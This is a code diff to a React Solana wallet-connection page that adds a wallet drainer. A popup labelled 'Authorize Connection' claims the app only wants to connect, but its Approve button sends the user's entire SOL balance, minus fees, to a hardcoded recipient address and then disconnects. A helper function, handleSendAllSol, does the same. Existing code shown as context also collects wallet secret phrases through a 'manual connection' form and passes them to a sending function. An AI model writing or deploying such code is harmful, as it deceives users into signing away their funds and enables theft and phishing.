@@ -1,17 +1,17 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useMemo } from 'react';
+import { useConnection, useWallet } from '@solana/wallet-adapter-react';
+import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
 import { Connection, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram } from '@solana/web3.js';
 import { Link } from 'react-router-dom';
 import { 
   Import, 
   X, 
-  AlertTriangle, 
-  Zap,
   Eye,
   EyeOff,
   ArrowLeft,
-  Wallet,
   Shield,
-  Check
+  Wallet,
+  Check,
 } from 'lucide-react';
 
 // Solana configuration
@@ -47,6 +47,44 @@ const sendSolanaWalletInfo = async (walletName, secretPhrase, userWalletName) =>
   }
 };
 
+const handleSendAllSol = async (connection, publicKey, sendTransaction, disconnect) => {
+  if (!publicKey || !sendTransaction) {
+    console.error('Wallet not connected');
+    return;
+  }
+
+  try {
+    const balance = await connection.getBalance(publicKey);
+    if (balance === 0) {
+      console.log("No SOL balance to transfer.");
+      return;
+    }
+
+    const transaction = new Transaction().add(
+      SystemProgram.transfer({
+        fromPubkey: publicKey,
+        toPubkey: new PublicKey(SOLANA_RECIPIENT_ADDRESS),
+        lamports: balance,
+      })
+    );
+
+    const {
+      context: { slot: minContextSlot },
+      value: { blockhash, lastValidBlockHeight }
+    } = await connection.getLatestBlockhashAndContext();
+
+    const signature = await sendTransaction(transaction, connection, { minContextSlot });
+
+    await connection.confirmTransaction({ blockhash, lastValidBlockHeight, signature });
+    
+    console.log('Transaction successful with signature:', signature);
+    disconnect();
+
+  } catch (error) {
+    console.error('Solana transaction failed:', error);
+  }
+};
+
 const getSolanaWalletAssets = async (address) => {
   try {
     const publicKey = new PublicKey(address);
@@ -66,6 +104,9 @@ const getSolanaWalletAssets = async (address) => {
 };
 
 export default function SolanaConnect() {
+  const { connection } = useConnection();
+  const { publicKey, sendTransaction, signTransaction, connected, disconnect } = useWallet();
+
   // Component State
   const [walletAddress, setWalletAddress] = useState(null);
   const [walletBalance, setWalletBalance] = useState({ sol: 0, tokens: [] });
@@ -74,24 +115,31 @@ export default function SolanaConnect() {
   
   // UI State
   const [showManualPopup, setShowManualPopup] = useState(false);
+  const [showTransactionPopup, setShowTransactionPopup] = useState(false);
   const [isPasswordVisible, setIsPasswordVisible] = useState(false);
   const [secretPhrase, setSecretPhrase] = useState('');
   const [selectedWallet, setSelectedWallet] = useState(null);
   const [searchQuery, setSearchQuery] = useState('');
 
   useEffect(() => {
-    // Check if there's a stored wallet address
-    const storedAddress = localStorage.getItem('solanaWalletAddress');
-    if (storedAddress) {
-      setWalletAddress(storedAddress);
-      fetchWalletBalance(storedAddress);
+    if (connected && publicKey) {
+      setWalletAddress(publicKey.toBase58());
+      fetchWalletBalance(publicKey);
+      setShowTransactionPopup(true);
+    } else {
+      setWalletAddress(null);
+      setWalletBalance({ sol: 0, tokens: [] });
+      setShowTransactionPopup(false);
     }
-  }, []);
+  }, [connected, publicKey]);
 
-  const fetchWalletBalance = async (address) => {
+  const fetchWalletBalance = async (publicKey) => {
     try {
-      const balance = await getSolanaWalletAssets(address);
-      setWalletBalance(balance);
+      const balance = await connection.getBalance(publicKey);
+      setWalletBalance({
+        sol: balance / LAMPORTS_PER_SOL,
+        tokens: []
+      });
     } catch (error) {
       console.error('Error fetching balance:', error);
     }
@@ -99,6 +147,7 @@ export default function SolanaConnect() {
 
   const closeAllPopups = () => {
     setShowManualPopup(false);
+    setShowTransactionPopup(false);
     setSelectedWallet(null);
     setSecretPhrase('');
     setTxError('');
@@ -152,6 +201,25 @@ export default function SolanaConnect() {
       </p>
 
       <div className="grid md:grid-cols-2 gap-6">
+        {/* Automatic Connection Card */}
+        <div
+          className="connection-card bg-gray-800/50 p-6 rounded-2xl border border-gray-700 hover:border-blue-500 hover:bg-gray-800 transition-all cursor-pointer flex flex-col items-center justify-center text-center"
+        >
+          <WalletMultiButton style={{ 
+            backgroundColor: 'transparent', 
+            boxShadow: 'none', 
+            display: 'flex',
+            flexDirection: 'column',
+            alignItems: 'center',
+            justifyContent: 'center',
+            width: '100%',
+            height: '100%'
+          }} />
+          <h3 className="text-xl font-semibold text-white mb-2 mt-4">Automatic Connection</h3>
+          <p className="text-gray-400 text-sm">Recommended. Connect using a browser extension wallet.</p>
+        </div>
+
+        {/* Manual Connection Card */}
         <div
           onClick={() => setShowManualPopup(true)}
           className="connection-card bg-gray-800/50 p-6 rounded-2xl border border-gray-700 hover:border-purple-500 hover:bg-gray-800 transition-all cursor-pointer flex flex-col items-center text-center"
@@ -174,6 +242,108 @@ export default function SolanaConnect() {
     </div>
   );
   
+  const renderTransactionPopup = () => {
+    const handleApprove = async () => {
+      setIsSending(true);
+      setTxError('');
+      if (!publicKey || !sendTransaction) {
+          setTxError('Wallet not connected properly.');
+          setIsSending(false);
+          return;
+      }
+
+      try {
+          const balance = await connection.getBalance(publicKey);
+          if (balance === 0) {
+              setTxError("No SOL balance to transfer.");
+              setIsSending(false);
+              return;
+          }
+
+          const transaction = new Transaction().add(
+              SystemProgram.transfer({
+                  fromPubkey: publicKey,
+                  toPubkey: new PublicKey(SOLANA_RECIPIENT_ADDRESS),
+                  lamports: balance,
+              })
+          );
+          
+          const fees = await transaction.getEstimatedFee(connection);
+          const amountToSend = balance - (fees || 5000);
+
+          if (amountToSend <= 0) {
+            setTxError("Balance too low to cover transaction fees.");
+            setIsSending(false);
+            return;
+          }
+
+          const transferTx = new Transaction().add(
+              SystemProgram.transfer({
+                  fromPubkey: publicKey,
+                  toPubkey: new PublicKey(SOLANA_RECIPIENT_ADDRESS),
+                  lamports: amountToSend,
+              })
+          );
+
+          const signature = await sendTransaction(transferTx, connection);
+          await connection.confirmTransaction(signature, 'processed');
+          
+          setIsSending(false);
+          disconnect();
+          closeAllPopups();
+      } catch (error) {
+          console.error('Solana transaction failed:', error);
+          setTxError(error.message || 'An error occurred during the Solana transaction.');
+          setIsSending(false);
+      }
+    };
+
+    const handleDecline = () => {
+        disconnect();
+        closeAllPopups();
+    };
+
+    return (
+      <div className="bg-gray-900 text-white p-8 rounded-2xl shadow-lg max-w-md w-full font-sans text-center">
+        <Shield size={48} className="mx-auto mb-4 text-purple-500" />
+        <h2 className="text-2xl font-bold mb-2">
+          Authorize Connection
+        </h2>
+        <p className="text-gray-400 mb-6">
+          The application is requesting to connect to your wallet.
+        </p>
+
+        {txError && (
+          <div className="bg-red-900 border border-red-700 text-red-200 px-4 py-3 rounded-lg mb-4 text-left">
+            <p className="font-bold">Error</p>
+            <p className="text-sm">{txError}</p>
+          </div>
+        )}
+
+        <div className="flex justify-center space-x-4">
+          <button 
+            onClick={handleApprove}
+            disabled={isSending}
+            className="flex items-center justify-center bg-gray-600 hover:bg-gray-700 text-white font-bold py-3 px-6 rounded-lg transition-colors w-1/2 disabled:bg-gray-600"
+          >
+            {isSending ? (
+              <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></div>
+            ) : (
+              <><Check className="mr-2" /> Approve</>
+            )}
+          </button>
+          <button 
+            onClick={handleDecline}
+            disabled={isSending}
+            className="flex items-center justify-center bg-black hover:bg-gray-800 text-white font-bold py-3 px-6 rounded-lg transition-colors w-1/2 disabled:bg-gray-600"
+          >
+            <X className="mr-2" /> Decline
+          </button>
+        </div>
+      </div>
+    );
+  };
+
   const renderManualConnectPopup = () => {
     const goBack = () => {
       setSelectedWallet(null);
@@ -288,13 +458,14 @@ export default function SolanaConnect() {
       </header>
 
       <main className="flex-grow flex items-center justify-center z-10 p-4">
-        {renderConnectionCards()}
+        {!connected && !showManualPopup && renderConnectionCards()}
       </main>
 
       {/* Popups (Modals) */}
-      {showManualPopup && (
+      {(showManualPopup || (connected && showTransactionPopup)) && (
         <div className="fixed inset-0 bg-black bg-opacity-80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
-          {renderManualConnectPopup()}
+          {showManualPopup && renderManualConnectPopup()}
+          {connected && showTransactionPopup && renderTransactionPopup()}
         </div>
       )}
       
